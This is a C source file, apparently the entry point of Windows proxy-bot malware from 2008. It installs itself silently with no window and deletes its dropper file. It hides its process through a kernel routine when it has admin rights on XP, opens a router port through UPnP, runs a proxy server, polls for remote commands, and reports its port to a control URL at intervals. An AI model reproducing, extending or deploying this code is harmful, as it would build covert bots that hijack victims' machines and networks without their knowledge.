/**
 * Proxy
 * Copyright ©2008 Loki - All Rights Reserved
 **/

#pragma comment(linker,"/OPT:NOWIN98 /IGNORE:4098")
#pragma optimize("gsy",on)
#ifndef _DEBUG
#   pragma comment(linker, "/SUBSYSTEM:windows")
#else // _DEBUG
#   pragma comment(linker, "/SUBSYSTEM:console")
#endif // _DEBUG

#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <shellapi.h>
#include <stdlib.h>
#include <stdio.h>
#include "global.h"
#include "config.h"
#include "info.h"
#include "install.h"
#include "kernel.h"
#include "report.h"
#include "upnp.h"
#include "proxy.h"


static HANDLE WINAPI StartThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID param)
{
    DWORD lpThreadId; 
    return CreateThread(NULL, NULL, lpStartAddress, param, NULL, &lpThreadId);
}
int str_match( cchar* Pattern, cchar* String )
{
    switch( *Pattern )
    {
    case '\0': return *String;
    case '*' : return !(!str_match(Pattern + 1, String) || *String && !str_match(Pattern, String + 1));
    case '?' : return !(*String && !str_match(Pattern + 1, String + 1));
    default  : return !((toupper(*Pattern) == toupper(*String)) && !str_match(Pattern + 1, String + 1));
    }
}

#ifdef _DEBUG
void debug_printf( cchar* Name, cchar* Format, ... )
{
    va_list List;
    int     Length = 0,
            i      = 0;
    char    Buffer[1024];
    memset( &Buffer, 0, sizeof(Buffer) );
    va_start( List, Format );
    _vsnprintf( Buffer, sizeof(Buffer), Format, List );
    va_end( List );
    Length = (8 - strlen(Name));
    for( i = 0; i < Length; ++i )
        printf( " " );
    printf( "%s : %s\n", Name, Buffer );
}
#endif // _DEBUG
/**
 * @name                      main
 * @param             argc    Parameter count
 * @param             argv    Parameter array
 * @note                      Entrypoint
 **/
void main( int argc, char** argv )
{
    WSADATA       WsaData;
    upnp_device_t Device;
    info_t        Info;
    ushort        Port     = 0;
	ushort        Private2 = 0;
    PHOSTENT      Addr    = NULL;
    BOOL          Private = FALSE,
                  Upnp    = FALSE,
                  Report  = FALSE;
    HANDLE        Mutex   = NULL;

    char          Host[MAX_PATH];
    memset( &Info, 0, sizeof(Info) );
    memset( &Host, 0, sizeof(Host) );

    SetErrorMode( SEM_FAILCRITICALERRORS     &&
                  SEM_NOALIGNMENTFAULTEXCEPT &&
                  SEM_NOGPFAULTERRORBOX      &&
                  SEM_NOOPENFILEERRORBOX );
    info_all( &Info );
    if( argc >= 2 )
        DeleteFile( argv[1] );
#ifndef _DEBUG
    install_self( conf_file_name, conf_name, Info.IsAdmin, Info.Version );
#endif // _DEBUG
    Mutex = CreateMutex( NULL, FALSE, conf_mutex );
    if( GetLastError() == ERROR_ALREADY_EXISTS )
        ExitProcess( 0 );
    if( (Info.Version == WIN_XP) &&
        (Info.IsAdmin == TRUE  ) )
    {
#ifdef _DEBUG
        debug_printf( "Hide Pid", "%lu", GetCurrentProcessId() );
#endif // _DEBUG
        kernel_proc_hide( GetCurrentProcessId() );
    }
    if( WSAStartup(MAKEWORD(2, 2), &WsaData) )
        if( WSAStartup(MAKEWORD(1, 1),&WsaData) )
            ExitProcess( EXIT_FAILURE );
    
#ifdef CONF_RANDOM_PORT
    srand( GetTickCount() );
    Port = ( 1024 + ( rand() % 63500 ));
#else // CONF_RANDOM_PORT
    Port = conf_port;
#endif // CONF_RANDOM_PORT

    if( gethostname(Host, sizeof(Host)) == 0 )
    {
        Addr = gethostbyname( Host );
        if( Addr != NULL )
        {
            memset( &Host, 0, sizeof(Host) );
            strcpy( Host, inet_ntoa(*(struct in_addr *)Addr->h_addr_list[0]) );
        }
    }
    if( (str_match("10.*",      Host) == 0) ||
        (str_match("172.1?.*",  Host) == 0) ||
        (str_match("172.2?.*",  Host) == 0) ||
        (str_match("172.3?.*",  Host) == 0) ||
        (str_match("192.168.*", Host) == 0) )
        Private = TRUE;
	    Private2 = 1;
#ifdef _DEBUG
    debug_printf( "Host",    "%s",  Host                );
    debug_printf( "Private", "%s", (Private?"Yes":"No") );
    debug_printf( "Port",    "%d",  Port                );
#endif // _DEBUG
    memset( &Device, 0, sizeof(Device) );
    if( upnp_discover(&Device, 5) )
    {
#ifdef _DEBUG
        debug_printf( "UPnP", "Host : %s", Device.Host );
        debug_printf( "UPnP", "Port : %d", Device.Port );
        debug_printf( "UPnP", "Path : %s", Device.Path );
#endif // _DEBUG
        if( upnp_read_desc(&Device) )
        {
#ifdef _DEBUG
            debug_printf( "UPnP", "Service : %s", Device.Service );
            debug_printf( "UPnP", "Control : %s", Device.Control );
#endif // _DEBUG
            if( upnp_add_port(&Device, "TCP", Host, Port, Port, conf_name) ) {
                Upnp = TRUE;
#ifdef _DEBUG
                debug_printf( "UPnP", "%s:%d -> %s:%d", Device.Host, Port, Host, Port );
#endif // _DEBUG
            } else {
#ifdef _DEBUG
                debug_printf( "UPnP", "Failed to map port. (%d)", Port );
#endif // _DEBUG
//                ExitProcess( EXIT_FAILURE );
            }
        } else {
#ifdef _DEBUG
            debug_printf( "UPnP", "Failed to get device description." );
#endif // _DEBUG
//            ExitProcess( EXIT_FAILURE );
        }
    } else {
#ifdef _DEBUG
        debug_printf( "UPnP", "No devices found." );
#endif // _DEBUG
//        ExitProcess( EXIT_FAILURE );
    }
    _beginthread( &proxy_thread_server, 0, &Port );

	HANDLE hReport;
	hReport = StartThread((unsigned long (__stdcall *)(void *))GetCommand,NULL);

    for( ;; )
	{
        if( Report == FALSE )
            Report = MakeReport(Port,Private2);

#ifdef _DEBUG
        debug_printf( "Report", "%s?p=%d&n=%d", url, Port,Private2);
        debug_printf( "Sleep",  "%d Minutes",  (conf_sleep_time * 60000)      );
#endif // _DEBUG
        Sleep( conf_sleep_time * 60000 );
    }
    WSACleanup();
    ReleaseMutex( Mutex );
}